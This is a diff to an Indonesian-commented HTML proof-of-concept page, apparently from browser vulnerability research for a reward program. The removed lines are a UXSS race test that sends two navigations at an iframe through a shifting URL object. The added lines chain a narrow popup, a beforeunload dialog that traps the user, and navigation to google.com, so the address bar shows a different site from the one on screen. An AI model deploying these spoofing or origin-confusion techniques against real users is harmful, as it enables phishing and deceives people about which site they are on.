@@ -1,37 +1,42 @@
-<!-- 49 | UXSS + W7 x W5  SIMULTANITAS x TIPE SALAH - dua origin diperebutkan sekaligus | [1-CLICK]
-     ASUMSI YANG DILANGGAR  "satu frame menuju satu origin pada satu waktu"
-     IDE GILA  tembakkan DUA navigasi ke DUA origin berbeda pada frame yang sama, di task yang sama,
-     dengan tujuan kedua berupa OBJEK yang baru menghitung URL-nya saat dibaca (W5).
-     Jadi saat browser sedang menentukan origin mana yang menang, kandidatnya berubah.
-     Strategi ini dipinjam dari FuzzOrigin: semakin sering operasi origin-update dipaksa terjadi,
-     semakin besar peluang menyentuh jalur yang cacat. Bedanya, di sini keduanya dipaksa
-     BERSAMAAN, bukan berantai.
-     PENGAMAT  sampler dua-pandangan berjalan tiap 60ms mencari kombinasi MUSTAHIL
-     (title terbaca padahal href ditolak, atau sebaliknya) - artinya dua bagian browser tak sepakat.
-     EXPECTED-SECURE  mustahil = 0 selamanya.  BOUNDED: 12 putaran lalu berhenti sendiri. -->
-<button onclick="go()">Run 49</button>
-<pre id=g style="font:12px/1.6 monospace"></pre>
+<!-- 49 | ⭐⭐ RANTAI — menggabungkan tiga primitif terkuat jadi satu skenario | [1-CLICK]
+     Satu primitif jarang cukup. Yang dibayar adalah RANTAI, karena tiap mata rantai menutup
+     salah satu jalan pengguna membantahmu.
+     TIGA YANG DIRANGKAI, dan alasan tiap-tiapnya:
+       (1) 18 · Safari menampilkan HANYA domain  -> permukaan yang harus dikalahkan tinggal
+                satu string pendek; tak ada skema/path/query yang tersisa untuk membantah
+       (2) 13 · dialog beforeunload              -> bar berganti ke tujuan, DAN pengguna
+                terkunci di dialog sehingga tak bisa memeriksa apa pun selama itu
+       (3) 25 · jendela sempit                   -> label domain terpotong, sisa teksnya
+                makin sedikit untuk dibaca
+     Ketiganya dipasang berurutan di satu jendela, dan tiap tahap mencetak apa yang harus
+     kamu amati. Kalau rantai ini menghasilkan keadaan "layar menampilkan halaman ini,
+     bar menulis lain, pengguna tak bisa memeriksa" — itu laporan penuh, bukan satu temuan kecil.
+     ETIKA  jendela & origin milikmu; konten netral; tak ada form, tak ada beacon, tak ada
+     peniruan merek. Tutup dialog kapan saja untuk keluar. -->
+<h2 style="font:20px system-ui">HALAMAN PENYERANG — perhatikan ia tidak pernah hilang</h2>
+<button onclick="go()">Jalankan rantai</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
-var B = 'https://example.com/';        // ganti ke origin KEDUA milikmu
-g.textContent = 'REAL ORIGIN: ' + location.href;
+var T = 'https://www.google.com/';
+g.textContent = 'REAL ORIGIN: ' + location.href + '\n\nKlik untuk merangkai 3 tahap.';
 function go() {
-  var f = document.createElement('iframe'); f.style.cssText = 'width:1px;height:1px;border:0';
-  document.body.appendChild(f);
-  var round = 0, bad = 0, reads = 0;
-  var shifty = { toString: function () { reads++; return reads % 2 ? B : '30.html'; } };
-  var a = setInterval(function () {
-    round++;
-    try { f.contentWindow.location.href = '30.html'; f.contentWindow.location.href = shifty; } catch (e) { }
-    if (round >= 12) clearInterval(a);
-  }, 400);
-  var b = setInterval(function () {
-    var t, l;
-    try { t = !!f.contentWindow.document.title || true; } catch (e) { t = false; }
-    try { l = !!f.contentWindow.location.href; } catch (e) { l = false; }
-    if (t !== l) bad++;
-    g.textContent = 'REAL ORIGIN: ' + location.origin + '\nputaran: ' + round + '/12   toString dibaca: ' + reads +
-      '\nkombinasi MUSTAHIL: ' + bad + '\n\n' + (bad ? 'CROSSED -> screenshot, STOP, lapor VRP' : 'dua pandangan sinkron');
-    if (round >= 12) clearInterval(b);
-  }, 60);
+  var w = window.open(location.href + '?tahap=2', 'rantai', 'width=300,height=380,left=80,top=80');
+  if (!w) { g.textContent = 'popup diblokir — izinkan popup untuk situs ini.'; return; }
+  g.textContent = 'REAL ORIGIN: ' + location.origin +
+    '\n\nTAHAP 1 selesai — jendela sempit (300px) dibuka.' +
+    '\n  amati: label domain di jendela itu terpotong?' +
+    '\n\nTAHAP 2 berjalan di jendela itu (dialog + navigasi).' +
+    '\n  amati di jendela sempit tsb:' +
+    '\n   a. bar menulis apa saat dialog muncul?' +
+    '\n   b. bisakah kamu mengklik bar-nya selagi dialog terbuka?' +
+    '\n   c. layar menampilkan halaman siapa?' +
+    '\n\nSatu screenshot yang memuat ketiganya = laporan.';
+}
+if (new URLSearchParams(location.search).get('tahap') === '2') {
+  document.body.innerHTML = '<div style="font:14px system-ui;padding:14px">' +
+    '<b>Jendela sempit.</b><p style="font:12px monospace">origin asli: ' + location.origin + '</p>' +
+    '<p style="font:12px">bar di atas menulis apa?</p></div>';
+  addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; return ''; });
+  setTimeout(function () { location.href = T; }, 1500);
 }
 </script>
